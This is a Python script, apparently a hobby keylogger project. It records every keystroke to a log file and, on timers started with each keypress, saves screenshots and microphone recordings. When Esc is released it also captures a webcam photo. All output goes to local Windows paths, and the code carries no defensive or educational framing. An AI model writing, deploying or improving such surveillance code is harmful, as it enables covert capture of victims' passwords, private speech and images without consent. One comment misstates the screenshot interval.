import pynput
import pyautogui
import threading
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
from pynput.keyboard import Key, Listener

count = 0
i = 0
keys = []


def on_press(key):
    global keys,count,i
    
    threading.Timer(15.0, takeScreenshot).start()  #this line calls the takeScreenshot function every 30 seconds
    threading.Timer(20.0, recordAudio).start()
    i+=1
    keys.append(key)
    count += 1
    #print("{0} pressed".format(key))

    if count >= 3:
        count = 0
        #print(type(keys[0]))
        write_file(keys)
        keys = []

#this function takes the screenshot of the code
def takeScreenshot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'C:\Users\HP\Desktop\Projects\Keylogger\screenshott'+str(i)+'.png')

#this function record audio
def recordAudio():
    fs = 44100  # Sample rate
    seconds = 3  # Duration of recording hello there i am sakshi HEHEHE

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished
    write(r'C:\Users\HP\Desktop\Projects\Keylogger\output'+str(i)+'.wav', fs, myrecording)  # Save as WAV file

#this function captures picture from webcam 
def faceCapture():
    
    camera = cv2.VideoCapture(0)
    return_value, image = camera.read()
    cv2.imwrite(r'C:\Users\HP\Desktop\Projects\Keylogger\opencv.png', image)
    del(camera)
    
    


def write_file(keys):
    with open(r"C:\Users\HP\Desktop\Projects\Keylogger\log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            
            elif k.find("Key") == -1 or k.find("Key") == 0:
                if k.find("Key") == 0:
                    f.write("\n")
                f.write(k+ " ")



def on_release(key):
    if key == Key.esc:
        faceCapture()
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
 